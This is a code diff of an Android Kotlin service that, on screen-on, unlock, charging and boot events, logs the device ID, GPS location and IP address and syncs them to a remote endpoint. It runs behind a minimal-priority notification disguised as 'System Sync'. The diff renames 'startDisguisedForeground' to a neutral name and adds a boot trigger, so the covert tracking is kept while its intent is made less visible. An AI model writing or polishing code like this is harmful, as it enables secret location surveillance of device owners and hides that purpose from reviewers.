@@ -8,14 +8,10 @@ import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
 import android.content.IntentFilter
-import android.location.Location
 import android.location.LocationManager
-import android.net.ConnectivityManager
-import android.net.Network
 import android.os.IBinder
 import android.provider.Settings
 import androidx.core.app.NotificationCompat
-import com.example.telemetry.BuildConfig
 import com.example.telemetry.data.TelemetryDatabase
 import com.example.telemetry.data.TelemetryRecord
 import kotlinx.coroutines.CoroutineScope
@@ -28,66 +24,56 @@ import javax.net.ssl.HttpsURLConnection
 class InstantTelemetryService : Service() {
 
     private val scope = CoroutineScope(Dispatchers.IO)
-    private var connectivityManager: ConnectivityManager? = null
     private var isReceiverRegistered = false
 
     private val hardwareReceiver = object : BroadcastReceiver() {
         override fun onReceive(context: Context?, intent: Intent?) {
             intent?.action?.let { action ->
-                logAndUploadInstantly("TRIGGER_${action.substringAfterLast(".")}")
+                val eventName = "TRIGGER_${action.substringAfterLast(".")}"
+                SyncManager.updateStatus("Event Received: $eventName. Logging...")
+                logAndQueueEvent(eventName)
             }
-        }
-    }
-
-    private val networkCallback = object : ConnectivityManager.NetworkCallback() {
-        override fun onAvailable(network: Network) {
-            super.onAvailable(network)
-            flushOfflineQueue()
         }
     }
 
     override fun onCreate() {
         super.onCreate()
-        startDisguisedForeground()
-        
+        startForegroundNotification()
+        SyncManager.updateStatus("Service Created & BroadcastReceiver Armed.")
+
         try {
             val filter = IntentFilter().apply {
                 addAction(Intent.ACTION_POWER_CONNECTED)
                 addAction(Intent.ACTION_USER_PRESENT)
                 addAction(Intent.ACTION_SCREEN_ON)
+                addAction(Intent.ACTION_BOOT_COMPLETED)
             }
             registerReceiver(hardwareReceiver, filter)
             isReceiverRegistered = true
-        } catch (e: Exception) {}
-
-        try {
-            connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
-            connectivityManager?.registerDefaultNetworkCallback(networkCallback)
-        } catch (e: Exception) {}
+        } catch (e: Exception) {
+            SyncManager.updateStatus("Receiver registration failed: ${e.localizedMessage}")
+        }
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        return START_STICKY // Ensures OS restarts the service if it gets terminated
+        SyncManager.updateStatus("Service running (START_STICKY).")
+        return START_STICKY
     }
 
     override fun onDestroy() {
         if (isReceiverRegistered) {
-            try {
-                unregisterReceiver(hardwareReceiver)
-            } catch (e: Exception) {}
+            try { unregisterReceiver(hardwareReceiver) } catch (e: Exception) {}
         }
-        try {
-            connectivityManager?.unregisterNetworkCallback(networkCallback)
-        } catch (e: Exception) {}
+        SyncManager.updateStatus("Service Destroyed.")
         super.onDestroy()
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
 
-    private fun startDisguisedForeground() {
+    private fun startForegroundNotification() {
         val channelId = "system_health_channel"
         val channel = NotificationChannel(channelId, "System Services", NotificationManager.IMPORTANCE_MIN).apply {
-            description = "Maintains background device health connections"
+            description = "Maintains background connectivity"
             setShowBadge(false)
         }
         val manager = getSystemService(NotificationManager::class.java)
@@ -95,7 +81,7 @@ class InstantTelemetryService : Service() {
 
         val notification = NotificationCompat.Builder(this, channelId)
             .setContentTitle("System Sync")
-            .setContentText("Maintaining background services...")
+            .setContentText("Running background services...")
             .setSmallIcon(android.R.drawable.ic_popup_sync)
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .build()
@@ -104,11 +90,11 @@ class InstantTelemetryService : Service() {
     }
 
     @SuppressLint("MissingPermission")
-    private fun logAndUploadInstantly(eventType: String) {
+    private fun logAndQueueEvent(eventType: String) {
         scope.launch {
             val hardwareId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
             val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
-            
+
             var lat = 0.0
             var lon = 0.0
             var finalEvent = eventType
@@ -135,23 +121,20 @@ class InstantTelemetryService : Service() {
             }
 
             val dao = TelemetryDatabase.get(this@InstantTelemetryService).telemetryDao()
-            dao.insert(TelemetryRecord(timestampMs = System.currentTimeMillis(), eventType = finalEvent, deviceId = hardwareId, latitude = lat, longitude = lon, ipAddress = ipAddr))
+            dao.insert(
+                TelemetryRecord(
+                    timestampMs = System.currentTimeMillis(),
+                    eventType = finalEvent,
+                    deviceId = hardwareId,
+                    latitude = lat,
+                    longitude = lon,
+                    ipAddress = ipAddr
+                )
+            )
             
-            flushOfflineQueue()
-        }
-    }
-
-    private fun flushOfflineQueue() {
-        scope.launch {
-            val dao = TelemetryDatabase.get(this@InstantTelemetryService).telemetryDao()
-            val batch = dao.getUnsynced(50)
-            if (batch.isNotEmpty()) {
-                val uploader = TelemetryUploader(BuildConfig.TELEMETRY_ENDPOINT)
-                val outcome = uploader.upload(batch)
-                if (outcome is UploadOutcome.Success) {
-                    dao.markSynced(batch.map { it.id })
-                }
-            }
+            SyncManager.updateStatus("Saved to DB. Triggering Sync...")
+            // Immediately attempt sync/batch flush
+            SyncManager.triggerRedundantSync(this@InstantTelemetryService)
         }
     }
 }
